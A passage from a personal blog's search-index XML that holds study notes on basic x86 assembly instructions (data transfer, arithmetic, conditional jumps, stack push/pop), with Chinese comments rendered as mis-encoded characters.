class="string">&quot;Result: %d\n&quot;</span>, result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¸‰-å¸¸ç”¨æŒ‡ä»¤ç¤ºä¾‹"><a href="#ä¸‰-å¸¸ç”¨æŒ‡ä»¤ç¤ºä¾‹" class="headerlink" title="(ä¸‰)å¸¸ç”¨æŒ‡ä»¤ç¤ºä¾‹"></a>(ä¸‰)å¸¸ç”¨æŒ‡ä»¤ç¤ºä¾‹</h2><h3 id="1-æ•°æ®ä¼ é€"><a href="#1-æ•°æ®ä¼ é€" class="headerlink" title="1. æ•°æ®ä¼ é€"></a>1. æ•°æ®ä¼ é€</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 10       ; å°† 10 é€å…¥ EAX å¯„å­˜å™¨</span><br><span class="line">mov ebx, eax      ; å°† EAX çš„å€¼ä¼ ç»™ EBX</span><br></pre></td></tr></table></figure><h3 id="2-ç®—æœ¯è¿ç®—"><a href="#2-ç®—æœ¯è¿ç®—" class="headerlink" title="2. ç®—æœ¯è¿ç®—"></a>2. ç®—æœ¯è¿ç®—</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add eax, ebx      ; EAX = EAX + EBX</span><br><span class="line">sub eax, 5        ; EAX = EAX - 5</span><br><span class="line">mul ebx           ; EAX = EAX * EBX</span><br><span class="line">div ecx           ; EAX = EAX / ECX</span><br></pre></td></tr></table></figure><h3 id="3-æ¡ä»¶è·³è½¬"><a href="#3-æ¡ä»¶è·³è½¬" class="headerlink" title="3. æ¡ä»¶è·³è½¬"></a>3. æ¡ä»¶è·³è½¬</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmp eax, ebx      ; æ¯”è¾ƒ EAX å’Œ EBX</span><br><span class="line">je equal_label    ; å¦‚æœç›¸ç­‰ï¼Œåˆ™è·³è½¬åˆ° equal_label</span><br><span class="line">jg greater_label  ; å¦‚æœå¤§äºï¼Œåˆ™è·³è½¬åˆ° greater_label</span><br></pre></td></tr></table></figure><h3 id="4-æ ˆæ“ä½œ"><a href="#4-æ ˆæ“ä½œ" class="headerlink" title="4. æ ˆæ“ä½œ"></a>4. æ ˆæ“ä½œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push eax          ; å°† EAX å‹å…¥æ ˆ</span><br><span class="line">pop ebx           ; ä»æ ˆä¸­å¼¹å‡ºå€¼åˆ° EBX</span><br></pre></td></tr></table></figure><script src="https://giscus.app/client.js"        data-repo="Samsara-lo/Samsara-lo.github.io"        data-repo-id="R_kgDONimTFg"        data-category="General"        data-category-id="DIC_kwDONimTFs4CorbM"        data-mapping="pathname"        data-strict="0"        data-reactions-enabled="1"        data-emit-metadata="0"        data-input-position="bottom"        data-theme="light_high_contrast"        data-lang="zh-CN"        crossorigin="anonymous"        async></script>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®°æ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ±‡ç¼– </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
